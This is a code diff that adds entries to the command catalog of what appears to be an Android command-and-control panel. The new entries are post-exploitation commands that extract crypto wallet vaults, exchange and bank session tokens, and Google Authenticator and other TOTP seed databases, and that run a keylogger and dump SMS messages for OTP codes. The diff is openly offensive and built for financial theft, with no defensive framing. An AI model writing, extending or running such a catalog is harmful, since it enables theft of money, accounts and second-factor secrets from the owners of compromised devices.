@@ -275,6 +275,55 @@ const COMMAND_CATALOG: C2Command[] = [
   { id: "passkey_1password",     name: "download /data/data/com.onepassword.android/databases/",             category: "Passkeys",  description: "Download 1Password encrypted vault DB" },
   { id: "passkey_bitwarden",     name: "download /data/data/com.x8bit.bitwarden/databases/",                 category: "Passkeys",  description: "Download Bitwarden encrypted vault DB" },
   { id: "passkey_keepass2",      name: "download -r /sdcard/",                                               category: "Passkeys",  description: "Search sdcard for .kdbx KeePass database files", needsParam: true, paramLabel: "Search path", paramPlaceholder: "/sdcard/" },
+
+  // ── Non-custodial Crypto Wallets ──────────────────────────
+  { id: "wallet_metamask",    name: "run post/android/capture/app_data -p io.metamask",                   category: "Finance",   description: "Extract MetaMask vault + preferences (ETH)" },
+  { id: "wallet_trust",       name: "run post/android/capture/app_data -p com.wallet.crypto.trustapp",   category: "Finance",   description: "Extract Trust Wallet keystore (multi-chain)" },
+  { id: "wallet_exodus",      name: "run post/android/capture/app_data -p exodusmovement.exodus",        category: "Finance",   description: "Extract Exodus wallet data" },
+  { id: "wallet_coinbasew",   name: "run post/android/capture/app_data -p org.toshi",                    category: "Finance",   description: "Extract Coinbase Wallet (ETH/SOL)" },
+  { id: "wallet_phantom",     name: "run post/android/capture/app_data -p app.phantom",                  category: "Finance",   description: "Extract Phantom wallet (Solana)" },
+  { id: "wallet_rainbow",     name: "run post/android/capture/app_data -p me.rainbow",                   category: "Finance",   description: "Extract Rainbow wallet (ETH)" },
+  { id: "wallet_imtoken",     name: "run post/android/capture/app_data -p im.token.app",                 category: "Finance",   description: "Extract imToken wallet (multi-chain)" },
+  { id: "wallet_tokenpocket", name: "run post/android/capture/app_data -p vip.mytokenpocket",            category: "Finance",   description: "Extract TokenPocket wallet" },
+  { id: "wallet_safepal",     name: "run post/android/capture/app_data -p io.safepal.wallet",            category: "Finance",   description: "Extract SafePal wallet" },
+  { id: "wallet_mew",         name: "run post/android/capture/app_data -p com.myetherwallet.mewwallet",  category: "Finance",   description: "Extract MyEtherWallet data" },
+  { id: "wallet_ledger",      name: "run post/android/capture/app_data -p com.ledger.live",              category: "Finance",   description: "Extract Ledger Live session data" },
+
+  // ── Crypto Exchange Session Theft ─────────────────────────
+  { id: "exch_binance",       name: "run post/android/capture/app_data -p com.binance.dev",              category: "Finance",   description: "Extract Binance session tokens + cookies" },
+  { id: "exch_coinbase",      name: "run post/android/capture/app_data -p com.coinbase.android",         category: "Finance",   description: "Extract Coinbase session tokens" },
+  { id: "exch_kraken",        name: "run post/android/capture/app_data -p com.kraken.trade",             category: "Finance",   description: "Extract Kraken session data" },
+  { id: "exch_crypto_com",    name: "run post/android/capture/app_data -p co.mona.android",              category: "Finance",   description: "Extract Crypto.com session tokens" },
+  { id: "exch_okx",           name: "run post/android/capture/app_data -p com.okinc.okex.gp",            category: "Finance",   description: "Extract OKX exchange session" },
+  { id: "exch_bybit",         name: "run post/android/capture/app_data -p com.bybit.app",                category: "Finance",   description: "Extract Bybit session tokens" },
+  { id: "exch_kucoin",        name: "run post/android/capture/app_data -p com.kubi.kucoin",              category: "Finance",   description: "Extract KuCoin session data" },
+
+  // ── Banking & Payment Apps ────────────────────────────────
+  { id: "bank_paypal",        name: "run post/android/capture/app_data -p com.paypal.android.p2pmobile",category: "Finance",   description: "Extract PayPal session + saved cards" },
+  { id: "bank_cashapp",       name: "run post/android/capture/app_data -p com.squareup.cash",            category: "Finance",   description: "Extract Cash App session data" },
+  { id: "bank_venmo",         name: "run post/android/capture/app_data -p com.venmo",                    category: "Finance",   description: "Extract Venmo session + bank link" },
+  { id: "bank_revolut",       name: "run post/android/capture/app_data -p com.revolut.revolut",          category: "Finance",   description: "Extract Revolut session tokens" },
+  { id: "bank_wise",          name: "run post/android/capture/app_data -p com.transferwise.android",     category: "Finance",   description: "Extract Wise transfer session" },
+  { id: "bank_chime",         name: "run post/android/capture/app_data -p com.onedebit.chime",           category: "Finance",   description: "Extract Chime session data" },
+  { id: "bank_chase",         name: "run post/android/capture/app_data -p com.chase.sig.android",        category: "Finance",   description: "Extract Chase bank session (root)" },
+  { id: "bank_bofa",          name: "run post/android/capture/app_data -p com.bankofamerica.mobile",     category: "Finance",   description: "Extract Bank of America session (root)" },
+  { id: "bank_wells",         name: "run post/android/capture/app_data -p com.wf.wellsfargomobile",      category: "Finance",   description: "Extract Wells Fargo session (root)" },
+
+  // ── 2FA / TOTP Seed Extraction ────────────────────────────
+  { id: "totp_gauth",         name: "download /data/data/com.google.android.apps.authenticator2/databases/databases", category: "Finance", description: "Download Google Authenticator TOTP DB (root)" },
+  { id: "totp_authy",         name: "run post/android/capture/app_data -p com.authy.authy",              category: "Finance",   description: "Extract Authy encrypted TOTP backup" },
+  { id: "totp_ms_auth",       name: "run post/android/capture/app_data -p com.azure.authenticator",      category: "Finance",   description: "Extract Microsoft Authenticator data" },
+  { id: "totp_2fas",          name: "download /data/data/com.twofasapp/databases/",                      category: "Finance",   description: "Download 2FAS TOTP database" },
+  { id: "totp_aegis",         name: "download /data/data/com.beemdevelopment.aegis/files/aegis.json",    category: "Finance",   description: "Download Aegis TOTP vault JSON" },
+  { id: "totp_andotp",        name: "download /data/data/org.shadowice.flocke.andotp/files/",            category: "Finance",   description: "Download andOTP TOTP backup" },
+
+  // ── Clipboard / Address Hijack ────────────────────────────
+  { id: "fin_clipboard_get",   name: "clipboard_get",                                                     category: "Finance",   description: "Get current clipboard content (live)" },
+  { id: "fin_clipboard_watch", name: "keyscan_start",                                                     category: "Finance",   description: "Start keylogger to capture financial credentials" },
+  { id: "fin_screenshot_wallet",name: "screenshot",                                                       category: "Finance",   description: "Screenshot wallet balance / seed display" },
+  { id: "fin_screen_record",   name: "run post/android/capture/screen_capture",                           category: "Finance",   description: "Capture screen during wallet/banking session" },
+  { id: "fin_sms_otp",         name: "dump_sms",                                                          category: "Finance",   description: "Dump SMS for OTP codes / bank notifications" },
+  { id: "fin_contacts_bank",   name: "dump_contacts",                                                     category: "Finance",   description: "Dump contacts for bank account / routing numbers" },
 ];
 
 export function getCommandsByCategory(): Record<string, C2Command[]> {
